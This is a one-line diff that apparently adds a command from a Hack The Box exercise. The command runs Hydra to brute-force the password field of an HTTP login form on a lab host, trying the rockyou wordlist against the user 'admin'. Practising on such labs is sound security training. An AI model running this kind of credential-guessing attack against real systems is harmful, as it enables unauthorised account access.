@@ -1,0 +1,1 @@
+hydra -l admin -P /home/ss/Downloads/KaliLists/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password" -s 30709
